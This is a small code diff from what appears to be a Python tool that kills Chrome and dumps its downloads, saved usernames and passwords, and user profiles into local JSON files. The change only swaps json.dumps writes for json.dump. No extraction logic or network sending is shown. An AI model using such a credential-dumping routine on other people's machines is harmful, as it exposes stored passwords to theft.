@@ -133,17 +133,19 @@ def generate_urls(path, files):
     return urls
 
 
+
+
 def dump_data(kill_chrome, deep):
     if kill_chrome:
         kill_process()
     path = get_os_path()
 
     with open('chrome_downloads.json', 'w') as f:
-        f.write(json.dumps(dump_downloads(path=path)))
+        json.dump(dump_downloads(path=path), f)
     with open('chrome_user_pass.json', 'w') as f:
-        f.write(json.dumps(dump_user_pass(path=path)))
+        json.dump(dump_user_pass(path=path), f)
     with open('chrome_users.json', 'w') as f:
-        f.write(json.dumps(dump_users(path=path)))
+        json.dump(dump_users(path=path), f)
 
     if deep:
         generate_all_files(path=path)
